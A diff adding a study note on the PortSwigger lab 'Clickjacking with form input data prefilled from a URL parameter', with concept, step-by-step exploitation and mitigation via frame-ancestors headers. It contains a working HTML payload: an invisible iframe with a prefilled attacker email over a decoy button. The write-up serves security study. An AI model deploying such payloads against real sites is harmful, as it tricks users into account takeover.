@@ -54,3 +54,56 @@ CSRF attacks rely on the attacker forging a cross-site request. Modern apps use 
 * X-Frame-Options: DENY (or SAMEORIGIN) - Legacy but widely supported.
 
 * Content-Security-Policy: frame-ancestors 'none' (or 'self') - Modern, robust standard.
+
+# 2nd Lab
+
+# 🛡️ Lab: Clickjacking with form input data prefilled from a URL parameter
+**Platform:** PortSwigger Web Security Academy
+**Goal:** Change the victim's email address by tricking them into clicking the "Update email" button via UI redressing.
+**Vulnerability:** Clickjacking combined with URL-based form data prefilling.
+
+## 🧠 The Concept (The Autofill Exploit)
+Clickjacking relies on intercepting clicks, not keystrokes. An attacker cannot force a victim to type malicious data into a hidden iframe. However, if the target application allows form inputs to be prefilled via URL parameters (e.g., `GET /profile?email=attacker@evil.com`), the attacker bypasses the typing restriction entirely. 
+The attacker frames the target page using the manipulated URL. The victim's browser loads the invisible iframe with the attacker's payload already inserted into the input field. The attacker then uses standard UI redressing to trick the victim into clicking the form's "Submit/Update" button, successfully executing the state-changing action with attacker-controlled data.
+
+## 🛠️ Step-by-Step Exploitation
+
+### Step 1: Verify the Prefill Feature
+Test the target endpoint by appending a parameter to the URL: `https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@test.com`. If the input field populates with the provided value, it is vulnerable.
+
+### Step 2: Craft the Exploit Payload
+Construct an HTML payload on the Exploit Server with a decoy button and the invisible iframe.
+**Crucial:** The `src` attribute of the iframe MUST contain the prefill parameter.
+
+```html
+<style>
+    iframe {
+        position: absolute;
+        width: 700px;
+        height: 500px;
+        top: 0;
+        left: 0;
+        opacity: 0.0001; /* Invisible cloak */
+        z-index: 2;
+    }
+    .decoy-button {
+        position: absolute;
+        top: 450px; /* Adjust for perfect alignment */
+        left: 80px; /* Adjust for perfect alignment */
+        z-index: 1;
+        padding: 10px;
+        background: red;
+        color: white;
+    }
+</style>
+<div class="decoy-button">Click to Win!</div>
+<iframe src="[https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@evil.com](https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@evil.com)"></iframe>
+```
+### Step 3: Align and Deliver
+1. Temporarily set iframe opacity: 0.5 to visually align the decoy button exactly underneath the target's "Update email" button.
+
+2. Once aligned, restore opacity: 0.0001.
+
+3. Deliver the exploit to the victim. The victim clicks the decoy, hitting the hidden "Update" button, which submits the prefilled attacker email. Lab Solved! 🎉
+
+**Key Takeaway / Mitigation**: Allowing state-changing form fields to be prefilled directly from URL parameters significantly increases the attack surface for CSRF and Clickjacking. Applications should rely on secure session state or explicit user input, and always deploy robust Anti-Clickjacking headers (Content-Security-Policy: frame-ancestors).
